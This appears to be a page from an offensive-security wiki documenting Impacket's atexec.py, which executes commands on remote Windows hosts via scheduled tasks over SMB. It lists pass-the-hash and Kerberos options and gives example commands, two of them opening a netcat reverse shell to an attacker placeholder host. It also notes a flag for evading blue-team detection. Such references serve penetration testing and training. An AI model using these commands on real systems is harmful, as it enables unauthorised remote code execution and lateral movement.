# atexec.py

[atexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) can be used to create and run an immediate scheduled task on a remote target via SMB in order to execute commands on a target system. It works only on version of Windows higher than Vista.&#x20;

The command to execute in the scheduled task must be provided to the script as a positional argument. The command's output can then be retrieved in a `.tmp` file with the same name as the scheduled task in `C:\Windows\Temp`.

## Commons

It has the following generic command line arguments, similar to many other tools:

* required positional argument #1: `[[domain/]username[:password]@]<targetName or address>` (e.g. `domain.local/user@dc01`, `domain/user:password@10.10.0.1`).

![required positional argument format](<../../.gitbook/assets/impacket\_positional\_arg-with target.png>)

* `-hashes`: the LM and/or NT hash to use for a [pass-the-hash](https://www.thehacker.recipes/ad/movement/ntlm/pth) (NTLM). The format is as follows: `[LMhash]:NThash` (the LM hash is optional, the NT hash must be prepended with a colon (`:`).
* `-aesKey`: the AES128 or AES256 hexadecimal long-term key to use for a [pass-the-key](https://www.thehacker.recipes/ad/movement/kerberos/ptk) authentication (Kerberos).
* `-k`: this flag must be set when authenticating using Kerberos. The utility will try to grab credentials from a Ccache file which path must be set in the `KRB5CCNAME` environment variable. In this case, the utility will do [pass-the-cache](https://www.thehacker.recipes/ad/movement/kerberos/ptc). If valid credentials cannot be found or if the `KRB5CCNAME` variable is not or wrongly set, the utility will use the password specified in the positional argument for plaintext Kerberos authentication, or the NT hash (i.e. RC4 long-term key) in the `-hashes` argument for [overpass-the-hash](https://www.thehacker.recipes/ad/movement/kerberos/opth). A Kirbi file could also be converted to a Ccache file using [ticketConverter.py](ticketconverter.py.md) in order to be used by the utility (indirect [pass-the-ticket](https://www.thehacker.recipes/ad/movement/kerberos/ptt)).
* `-no-pass`: this flag must be set when an empty password will by used, or no password at all. Without this flag, the user will be prompted for a password when running the utility. This flag is especially useful when using `-k`.
* `-dc-ip`: IP address of the domain controller. If omitted, the positional argument's domain part will be used (in that case, it must be a Fully-Qualified-Domain-Name (FQDN)).
* `-debug`: with this flag set, the utility will be more verbose and will possibly print useful information for debug purposes. With this flag set, the utility will also print tracebacks.
* `-ts`: with this flag set, the utility will prepend all output with a timestamp.

## Specificities

It also has the following specific command line arguments:

* required positional argument #2: command to execute on the target system (e.g. `whoami` or `'powershell -c "nc.exe attacker_ip listener_port -e cmd.exe"'`)
* `-session-id`: executes the scheduled task in the context of a specific existing logon session without using `cmd.exe`. If omitted, the session 0 will be used.
* `-silentcommand`: avoid using `cmd.exe` to run the specified command. The scheduled task will run the specified command without prepending `cmd.exe /C` (e.g. `C:\Windows\System32\hostname.exe` will be executed instead of `cmd.exe /C 'hostname'`). It is useful to reduce blue team detection, however no output is available.&#x20;
* `-codec`: set target output encoding to a specific value. If errors are detected, run `chcp.com` on the target, map the result with [the python documentation](https://docs.python.org/3/library/codecs.html#standard-encodings), and then execute atexec.py again with `-codec` and the corresponding codec. If omitted, `utf-8` will be used (e.g. for French systems, the `cp850` codec can be used)
* `-keytab`: authenticate using Kerberos keys from a KEYTAB file.

```bash
# with cleartext credentials
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami

# pass-the-hash (with an NT hash)
atexec.py -hashes :'NThash' 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami

# kerberos ticket in memory
atexec.py -no-pass -k 'DOMAIN'/'USER'@'target_ip' 'powershell -c "nc.exe attacker_ip 4545 -e cmd.exe"'
```
